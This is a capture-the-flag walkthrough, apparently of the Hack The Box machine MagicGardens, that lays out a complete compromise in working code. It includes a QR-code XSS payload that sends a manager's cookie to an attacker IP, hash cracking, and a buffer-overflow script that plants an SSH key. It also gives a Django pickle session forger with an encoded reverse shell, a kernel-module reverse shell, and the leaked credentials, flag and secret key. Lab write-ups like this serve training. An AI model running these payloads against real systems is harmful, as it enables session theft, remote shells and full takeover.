**Ping** 
![[Pasted image 20240709094851.png]]

**Nmap Scans**
```
mapit 10.10.11.9
```

Nmap Default Scan
![[Pasted image 20240709094943.png]]

Nmap Service and Script Scan
![[Pasted image 20240709095102.png]]

Nmap All Port Scan
![[Pasted image 20240709101211.png]]

Nmap Service and Script Scan for new port
![[Pasted image 20240709101252.png]]

On port 80 http://10.10.11.9
![[Pasted image 20240709095314.png]]

Updated my hosts file
![[Pasted image 20240709095257.png]]

Now I can reach the site on Port 80 http://magicgardens.htb
![[Pasted image 20240709100634.png]]

Will enumerate this website....!

Gobuster Scan
```
gobuster dir -u http://magicgardens.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240709101611.png]]

Admin Login panel on http://magicgardens/admin
![[Pasted image 20240709102037.png]]

In the subscription page, while upgrading, each option has a request a bank, we can see in the below SS
![[Pasted image 20240709103039.png]]
This is the subscription page

If you select a payment method, it will request to the server accordingly
![[Pasted image 20240709103230.png]]

We can see here, if I choose first option
![[Pasted image 20240709103420.png]]
We can see honestbank.htb, I have checked my adding this to my host file, but there is nothing 

So will redirect the request to our malicious server using this test bank github repo https://github.com/sk03d/flask_bank_api
![[Pasted image 20240709103700.png]]

We can replace the honestbank.htb with our vpn IP 10.10.14.6:80 and forward the requets to get the discount QR
Don't Replace it with the bank IP, it won't work

We can see the request from the website
![[Pasted image 20240709110825.png]]

Got the QR and downloaded it
![[Pasted image 20240709110554.png]]

Will go and purchase something with this discount
![[Pasted image 20240709111031.png]]
Will buy this...!

Will wait for the manager to contact
![[Pasted image 20240709111055.png]]

Got a message from morty, probably the manager, requesting me to upload the QR code
![[Pasted image 20240709111142.png]]

Will upload our malicious qr for steal the cookie of morty, First will decode the qr content using https://zxing.org
![[Pasted image 20240709113846.png]]

Will add our payload and create our malicious QR using https://www.qrcode-monkey.com/
Payload:URL
```
http://098f6bcd4621d373cade4e832627b4f6.0d341bcdc6746f1d452b3f4de32357b9.</p><script>var i=new Image(); i.src="http://10.10.14.6:4444/?cookie="+btoa(document.cookie);</script><p>
```
![[Pasted image 20240709113939.png]]

And Uploaded the the malicious qr to morty
![[Pasted image 20240709114111.png]]

Started webserver on port 444 and eventually got the cookie
![[Pasted image 20240709113729.png]]

Found the csrf token with the base64 encoded cookie of morty
![[Pasted image 20240709114530.png]]

I can't login via admin panel
![[Pasted image 20240709121042.png]]
**Most importantly, don't change the csrf token in login request, only change the session cookie**

will do the same in user login page
![[Pasted image 20240709121418.png]]
It will intercept another request, again change only the session cookie and forward it
![[Pasted image 20240709122715.png]]

Jump to Initial foothold.......!


Logged in as Morty
![[Pasted image 20240709121204.png]]

Now update the session id with Morty's session id here
![[Pasted image 20240709123043.png]]
Or it will logged out for if you refresh are click anything the website

Now I have just added /admin the url and I'm in Admin's dashboard http://magicgardens/admin
![[Pasted image 20240709124031.png]]

We can see the store users
![[Pasted image 20240709124425.png]]

Also able to see the stored password of morty
![[Pasted image 20240709124457.png]]
Will try to crack that password

Found the hash type, it is Django
![[Pasted image 20240709124605.png]]

Cracked the hash using hashcat
```
hashcat --help | grep -i "DJANGO"
```
```
hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt --force
```
![[Pasted image 20240709125100.png]]
Found hash type 
\
Then Cracked it...!
![[Pasted image 20240709125143.png]]
it is **morty:jonasbrothers**


Finally got a session as morty via ssh
```
ssh morty@magicgardens
```
![[Pasted image 20240709125404.png]]

Don't have permission for alex
![[Pasted image 20240709125528.png]]

Alex is running Something
```
pas aux
```
![[Pasted image 20240709130117.png]]
He is running harvest, will check that.

I ran the harvest
```
harvest
```
![[Pasted image 20240709130316.png]]

Will transfer the harvest file to my kali machine using scp
```
scp -P 2222 /usr/local/bin/harvest kali@10.10.14.6:/home/kali/
```
![[Pasted image 20240709133322.png]]

Now will analyse the harvest file using reverse engineering tools

And came to know that this server is vulnerable to buffer overflow
I have just initiated and try to handshake with the server
```
./harvest server
```
![[Pasted image 20240709134514.png]]
```
echo "harvest v1/0.3" | nc 127.0.0.1 1337
```
![[Pasted image 20240709134540.png]]
We can handshake to the server when we sent version of the server

Well will write our ssh public key to Alex's authorized_key using this server and script
The python script to write our public key
```
import socket

server_address = ('::1', 6666)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server_address)

data = bytearray(b'\n' * 65403)

# Replace this with your SSH public key
key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvqEOF3sUHMdXMcutJnRBN4cSoInz1ZgUIHueLkQapyJ9/GoMJ84gyEqdrbDP4wyfGi/Ftc38lMK3zuM3En0ZtcIezY9veVilBR4YYNhegpYLEtf3s+JOoZWWK5EEGYUABheQEFUZRmKD6Hwi+ZgvJaqfYh279ACwPwb9T8s5f0zsJRSg2rKRh5tAQZ27cb9hJUenRcB2p2WqZvj2t2jz7olTR2NpgpmFKTjdN5xAPMmvKsQ4xXyg72qKQM4bTfAEm0GYa8TNtp1XnrCE/nM5JsZtXUeLhGwTpuhtC3E20Jlf0PWRAJLigHvOhXOJ8pVcmvkGRU+ZCsrk0pRqCtHLEVaPTxC7kxpkUUDqo+iPVhdW/XI4+pJ6A77pxwkBNYacfdeVAjD6pkZF45x+pQ04RjPjdepEup+6S9aXWjzSkNLjt/lsYMbytCY7ujzsjxyG8JCyIvBKCe0ZD1Ab9V83T0J91MJRRMyYU1ySsljQEx9AGa6Fyt0koCNzKhZ1ujOM= root@kali'

replace = b"/home/alex/.ssh/authorized_keys"

sendData = data[:65372] + replace
sendData[12:12+len(key)] = key.encode()

s.send(sendData)
```

Now will start the server using this command
```
strace -t -e trace=openat ./harvest server -l out.txt
```
![[Pasted image 20240709154858.png]]

Then we have to transfer our script the morty and execute it
```
echo "harvest v1.0.3" > /dev/tcp/127.0.0.1/1337  
python3 exp.py
```
![[Pasted image 20240709155225.png]]

We can see the Server
![[Pasted image 20240709155306.png]]

I think it is written, will check that
```
ssh -i id_rsa alex@10.10.11.9
```
![[Pasted image 20240709155454.png]]
The passphrase is mine, you can create your own ssh key with or without passphrase

**User.txt**
![[Pasted image 20240709155650.png]]
user.txt
f1e38472b2d9f023df201d2d5df7a543

Will Jump to Privilege Escalation....!

I Can See mails of Alex
![[Pasted image 20240709160003.png]]
![[Pasted image 20240709160022.png]]

I have decode the base64 content and saved it in to a file named auth.zip
```
echo "UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44Sq4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIeAwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pGZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=" | base64 -d > auth.zip
```
```
unzip auth.zip
```
![[Pasted image 20240709161118.png]]
It is asking password....!

Will use our Friend John
```
zip2john auth.zip > auth.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt auth.hash
```
![[Pasted image 20240709161232.png]]
Found password **realmadrid**

Well unzipped the file and got another hash
![[Pasted image 20240709161541.png]]

Will cark it using John again
![[Pasted image 20240709161653.png]]
Found the creds, this must be for the docker **alex:diamonds**

Now we will try to grab the docker registries for that we will be using this git hub repo:
https://github.com/Syzik/DockerRegistryGrabber
```
python3 /root/Tools/DockerRegistryGrabber/drg.py https://magicgardens.htb -U AlexMiles -P diamonds --dump magicgardens.htb
```
![[Pasted image 20240709164648.png]]

Used this command to locate morty's layer in the registry
```
zgrep -la morty *.tar.gz
```

And dumped the the registry and found the Django's secret key in on of the registry, and this the python script will give us shell as root use the secret key found and encode your reverse shell payload in the script
```
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings

settings.configure(SECRET_KEY="55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b")


class CreateTmpFile(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.call,
                (['bash',
                  '-c','echo AC8AYgBpAG4ALwBiAGEAcwBoACAALQBjACAAJwAvAGIAaQBuAC8AYgBhAHMAaAAgAC0AaQAgAD4AJgAgAC8AZABlAHYALwB0AGMAcAAvADEAMAAuADEAMAAuADEANAAuADYALwA0ADQAMwAgADAAPgAmADEAJw== | base64 -d | bash'],))


sess = signing.dumps(
    obj=CreateTmpFile(),
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies'
)


print(sess)

```

Will execute this code, and it will give us a session id
![[Pasted image 20240709165228.png]]

![[Pasted image 20240709170535.png]]
We have to replace the session id in the burp request and forward it at the same time start nc listener on the port which we have used in the payload
Got shell as root
![[Pasted image 20240709165534.png]]

But we don't have root.txt here, because this is docker's machine
![[Pasted image 20240709165750.png]]

With some hints on here an there, found the machine is vulnerable to cap_sys_module, So will follow the Link https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities?source=post_page-----65c956d588fa--------------------------------#cap_sys_module to Get shell as root on 10.10.11.9

reverse-shell.c
```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.6/443 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Makefile
```
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Transferred both file to the target and first make the file and execute the reverse shell 
```
make
```
```
insmod reverse-shell.ko
```
![[Pasted image 20240709173316.png]]

At the Sametime I have already stated the nc listener on port 443
Got shell as root
![[Pasted image 20240709173425.png]]

**Root.txt**
![[Pasted image 20240709173537.png]]



This is really Insane...!
Done with MagicGardens.....:)
